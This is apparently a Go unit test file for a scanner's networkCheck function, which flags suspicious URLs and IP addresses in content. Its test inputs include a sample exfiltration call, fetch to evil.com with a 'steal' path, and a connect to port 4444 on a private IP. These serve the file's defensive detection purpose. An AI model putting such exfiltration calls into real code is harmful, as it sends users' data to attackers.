package scanner

import "testing"

func TestURLDetect(t *testing.T) {
	data := []byte(`fetch("https://evil.com/steal?data=foo")`)
	result := networkCheck(data, false)
	if !result.Block {
		t.Error("expected Block true for suspicious URL")
	}
	if result.Reason != "network" {
		t.Errorf("expected Reason network, got %s", result.Reason)
	}
}

func TestURLNotDetectClean(t *testing.T) {
	data := []byte(`print("This has no URLs")`)
	result := networkCheck(data, false)
	if result.Block {
		t.Error("expected Block false for clean content")
	}
}

func TestPrivateIPDetect(t *testing.T) {
	data := []byte(`connect("192.168.1.100", 4444)`)
	result := networkCheck(data, false)
	if !result.Block {
		t.Error("expected Block true for private IP when not allowed")
	}
}

func TestPrivateIPAllowed(t *testing.T) {
	data := []byte(`connect("10.0.0.1", 8080)`)
	result := networkCheck(data, true)
	if result.Block {
		t.Error("expected Block false for private IP when allowed")
	}
}

func TestPublicIPDetect(t *testing.T) {
	data := []byte(`hack("8.8.8.8")`)
	result := networkCheck(data, false)
	if !result.Block {
		t.Error("expected Block true for public IP")
	}
}
